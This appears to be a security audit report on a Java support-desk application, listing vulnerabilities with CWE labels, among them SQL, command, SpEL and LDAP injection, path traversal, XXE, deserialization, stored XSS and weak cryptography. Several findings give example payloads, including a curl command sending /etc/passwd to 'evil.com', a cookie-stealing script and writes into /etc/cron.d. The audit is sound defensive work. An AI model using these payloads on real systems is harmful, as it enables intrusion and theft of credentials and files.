extra.message: The X-Requester-Email header value is concatenated directly into a SQL query string and executed with Statement.executeQuery(). An attacker-controlled header like "' UNION SELECT ... --" injects arbitrary SQL against the tickets/app_users tables.

The `target` format parameter (user-supplied via DeskController.rendition's `target` query param) is concatenated directly into a shell command string and executed with `new ProcessBuilder("sh","-c",command)`. A value like `pdf; curl evil.com/$(cat /etc/passwd)` executes arbitrary OS commands.

The `expr` request parameter is parsed and evaluated with SpelExpressionParser against a full StandardEvaluationContext (not SimpleEvaluationContext). This allows arbitrary method/static invocation, e.g. `T(java.lang.Runtime).getRuntime().exec('...')`, giving any TEAM_LEAD/SUPPORT_ADMIN caller remote code execution on the server.

SignedJWT.parse(receipt) only parses the token's structure; `.verify(...)` is never called on the resulting SignedJWT, so the signature is never checked. This endpoint is permitAll (SecurityConfig `/partner/status/**`). Anyone can forge a JWT with an arbitrary `organization` claim and any garbage signature to read any organization's ticket data.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: conversationReceipt is @PreAuthorize("permitAll()") (and /portal/conversations/** is permitAll in SecurityConfig). It looks up a ticket by a sequential in-memory reference ("CH-" + AtomicLong), with no ownership check at all. Any unauthenticated visitor can enumerate CH-4128, CH-4129, ... and read any ticket's public message thread, bypassing authentication entirely.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key
CWE-330: Use of Insufficiently Random Values

extra.message: A raw Tomcat DefaultServlet is registered on /archive/* with directory listings enabled, and its document root is pointed directly at the attachment storage directory (same files AttachmentService serves through ownership/internal-only checks). Any authenticated user — including a CUSTOMER_USER — can browse and download every attachment for every ticket/organization at /archive/, completely bypassing AuthorizationService.requireDownload.

cwe: CWE-548: Exposure of Information Through Directory Listing

extra.message: `employeeNumber` (from DirectoryController.byEmployeeNumber's request param) is concatenated directly into the LDAP search filter `(employeeNumber=...)` with no escaping. A value like `*)(|(uid=*` alters the filter logic, allowing filter-injection attacks against the corporate directory.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query

extra.message: `uid` (from DirectoryController.byUid's @PathVariable) is concatenated directly into the LDAP filter `(&(objectClass=person)(uid=...))` with no escaping, allowing LDAP filter injection in the same way as findByEmployeeNumber.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query

extra.message: `name` (from DirectoryController.fromExport's `name` request param) is concatenated directly into the XPath expression `//agent[name='...']` executed with dom4j's selectNodes. A value like `'] | //agent[position()<100` or similar changes the query logic, allowing XPath injection against the directory export.

cwe: CWE-643: Improper Neutralization of Data within XPath Expressions

extra.message: storeArchiveDocument resolves `documentName` (partner-supplied, from ApiTicketController's ArchiveDocumentRequest.documentName, validated only for blankness/length) directly against baseDirectory with no normalize()/startsWith() containment check — unlike the sibling `store()` method and `resolveWithinBase()`. A value like `../../../../etc/cron.d/evil` lets an authenticated integration caller (SUPPORT_AGENT scope) write arbitrary files outside the attachment store.

archiveIndex resolves `folder` (partner-supplied, from ApiTicketController's ArchiveIndexRequest.folder) directly against baseDirectory with no containment check, then lists its contents. A value like `../../../etc` lists arbitrary directories on the filesystem, not just the attachment store.

importOrganizationDocument parses an admin-uploaded XML file with a default DocumentBuilderFactory that has not disabled DOCTYPE declarations or external entity resolution (no setFeature calls for disallow-doctype-decl / external-general-entities, no FEATURE_SECURE_PROCESSING). A crafted XML upload can declare an external entity to read local files or trigger SSRF.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: retainSubmitted resolves the client-supplied original filename (`file.getOriginalFilename()`) directly against the imports folder with no normalize()/containment check before calling `file.transferTo(target)`. A crafted multipart filename such as `../../../../etc/cron.d/evil` can write the uploaded content outside the imports directory.

importContactsFeed fetches an admin-supplied `feedUrl` with RestTemplate without any host/scheme allow-list (unlike ConfigurationService.validateWebhookTarget, which blocks localhost/link-local/private ranges for webhook targets). An admin (or anyone who can reach this endpoint via a compromised admin session) can make the server issue requests to internal-only services.

archiveReport resolves the `folder` argument (sourced from the client-controlled `SD_REPORT_DIR` cookie in ReportsController.archive) against the reports directory with no normalize()/containment check before creating directories and writing the file. A crafted cookie value like `../../../../tmp/evil` writes the exported CSV outside the intended reports folder.

legacyBatch base64-decodes the X-Legacy-Batch header and deserializes it with a plain ObjectInputStream.readObject() with no class allow-list/look-ahead filtering. An authenticated API caller can submit a crafted serialized payload to trigger a Java deserialization gadget chain against whatever gadget libraries are on the classpath.

The attachment's original filename is rendered with `th:utext` (unescaped) in the desk attachment list. AttachmentService.sanitiseDisplayName only strips control characters, quotes, backslash and forward slash — it does not strip `<`/`>` — so a customer or staff upload named e.g. `<script>document.location='//evil/?c='+document.cookie</script>.txt` is stored verbatim and renders as live HTML/JS to any staff member (including SUPPORT_ADMIN) who views that ticket's attachments. The equivalent portal template uses safe `th:text`.

The partner-supplied `retUrl` field is placed directly into the HTTP `Location` header of a 303 redirect with no validation that it points at a trusted/local destination. A crafted intake form can redirect the visitor's browser to an attacker-controlled site.

recordCredential and verifyCredential hash the phone-channel passphrase with unsalted MD5 (`MessageDigest.getInstance("MD5")`) and store the raw hex digest in `legacy_credential_hash`. MD5 is cryptographically broken and, with no per-user salt, is trivially reversible via rainbow tables/brute force if the database is disclosed.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort
CWE-327: Use of a Broken or Risky Cryptographic Algorithm

extra.message: AES/CBC encryption uses a fixed, all-zero IV (`new byte[16]`) shared across every call, and the key is derived by truncating/zero-padding a configurable string whose default (`AcmeSupportDesk!`) is hardcoded in source. A static IV under CBC leaks that two share-link ciphertexts encrypt the same plaintext (identical article ids produce identical ciphertext), and the weak/default key makes the share-link scheme easy to break if the default is left in place.

cwe: CWE-329: Generation of Predictable IV with CBC Mode

extra.message: When an X-Api-Key value fails to resolve, the full presented credential value is written to the application log at WARN level (`presented={}`). A mistyped-but-otherwise-valid key, or a key typo'd from a different active key, ends up readable in plaintext log files.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: The SD_DESK_SESSION cookie is set to the live HttpSession id with `setHttpOnly(false)` and `setSecure(false)`. Any script running on the page (e.g. via the stored-XSS attachment filename issue) can read this cookie value and exfiltrate the session identifier; it is also sent over plain HTTP.

cwe: CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
